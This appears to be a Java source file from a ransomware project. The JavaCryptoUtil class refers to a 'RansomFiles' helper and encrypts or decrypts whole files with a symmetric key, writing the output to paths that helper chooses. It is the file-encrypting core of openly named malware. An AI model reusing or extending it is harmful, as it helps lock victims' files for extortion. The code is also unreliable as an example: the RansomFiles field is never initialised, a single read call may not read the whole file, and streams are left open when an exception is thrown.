package Agent.EncryptionAlgo;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import Agent.exceptions.CryptoException;

public class JavaCryptoUtil {
	private RansomFiles changeFile;

	// comment233
	public void doCrypto(SecretKey skey, File inputFile, int cipherMode, File outputFile, String algorithm)
			throws CryptoException {

		try {
			SecretKey secretKey = new SecretKeySpec(skey.getEncoded(), algorithm);
			Cipher cipher = Cipher.getInstance(algorithm);
			cipher.init(cipherMode, secretKey);

			FileInputStream inputStream = new FileInputStream(inputFile);
			byte[] inputBytes = new byte[(int) inputFile.length()];
			inputStream.read(inputBytes);
			byte[] outputBytes = cipher.doFinal(inputBytes);
			FileOutputStream outputStream = new FileOutputStream(outputFile);
			outputStream.write(outputBytes);

			inputStream.close();
			outputStream.close();
		} catch (NoSuchPaddingException | NoSuchAlgorithmException | InvalidKeyException | BadPaddingException
				| IllegalBlockSizeException | IOException ex) {
			throw new CryptoException();
		}

	}

	public void decrypt(SecretKey skey, File fileToDecrypt, String algoritm) throws CryptoException {
		File file = changeFile.decryptInputFile(fileToDecrypt);
		doCrypto(skey, fileToDecrypt, Cipher.DECRYPT_MODE, file, algoritm);
	}

	public void encrypt(SecretKey skey, File fileToEncrypt, String algoritm) throws CryptoException {

		doCrypto(skey, fileToEncrypt, Cipher.ENCRYPT_MODE,changeFile.encryptInputFile(fileToEncrypt),
				algoritm);
	}

}
